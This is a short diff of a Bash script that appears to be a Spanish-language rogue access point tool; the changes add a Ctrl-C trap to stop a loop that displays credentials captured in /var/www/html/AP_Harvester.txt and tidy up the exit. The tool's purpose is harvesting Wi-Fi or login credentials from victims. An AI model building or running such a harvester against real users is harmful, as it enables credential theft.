@@ -10,6 +10,10 @@ purpleColour="\e[0;35m\033[1m"
 turquoiseColour="\e[0;36m\033[1m"
 grayColour="\e[0;37m\033[1m"
 
+xxx(){
+	q=1
+} && trap 'xxx' SIGINT
+
 attack()
 {
 	clear && sleep 1 && echo -e "${yellowColour}Creando fichero de configuración dhcp...${endColour}" && sleep 1
@@ -89,17 +93,21 @@ cleaner()
 
 credentialsMonitor()
 {
-	while true; do
-		clear && echo -e "${yellowColour}Monitorizando credenciales introducidas [$endColour${blueColour}Refresco de 5 segundos${endColour}${yellowColour}]: \n${endColour}"
-
+	while true; do clear && echo -e "${yellowColour}Monitorizando credenciales introducidas [$endColour${blueColour}Refresco de 5 segundos${endColour}${yellowColour}]: \n${endColour}"
 		if [ -f /var/www/html/AP_Harvester.txt ]; then
 			cat /var/www/html/AP_Harvester.txt
 		fi && sleep 5
+
+		if [ "$q" == "1" ]; then
+			break
+		fi
 	done
 }
 
 menu()
 {
+	q=0
+
 	echo -e "$yellowColour╱╭╮╱╱╱╱╱╱╱╱╭╮╭━╮╭━╮" && sleep 0.06
 	echo -e "╭╯╰╮╱╱╱╱╱╱╭╯╰┫┃╰╯┃┃" && sleep 0.06
 	echo -e "╰╮╭╋━┳╮╭┳━┻╮╭┫╭╮╭╮┣━━╮" && sleep 0.06
@@ -139,7 +147,7 @@ if [ "$(id -u)" -eq "0" ]; then
 			4) credentialsMonitor
 				;;
 
-			0) exit
+			0) tput cnorm && exit
 				;;
 
 		esac
